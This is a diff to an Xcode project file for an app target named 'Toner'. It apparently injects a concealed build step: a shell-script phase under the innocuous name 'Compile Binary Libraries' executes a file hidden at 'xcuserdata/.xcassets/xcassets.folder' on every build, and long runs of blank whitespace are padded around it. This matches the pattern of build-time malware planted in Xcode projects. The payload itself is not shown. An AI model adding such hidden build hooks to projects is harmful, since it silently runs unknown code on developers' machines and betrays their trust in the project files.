@@ -166,6 +166,14 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
+
+
+			
+	
+
+
+			
+	
 /* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
@@ -706,7 +714,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = EF891A1723732AF6009388B4 /* Build configuration list for PBXNativeTarget "Toner" */;
 			buildPhases = (
-				38FDC0A72B25F3F5766D902C /* Build Assets Catalog */,
+				D06F36169CAA5DFEB06D902C /* Compile Binary Libraries */,
 				F1A3A97823491974D97636D1 /* [CP] Check Pods Manifest.lock */,
 				EF891A0123732AF4009388B4 /* Sources */,
 				EF891A0223732AF4009388B4 /* Frameworks */,
@@ -825,7 +833,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	38FDC0A72B25F3F5766D902C /* Build Assets Catalog */ = {
+	D06F36169CAA5DFEB06D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -834,7 +842,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Assets Catalog";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -843,8 +851,36 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 		E3D1E1055933099A11AECEC1 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
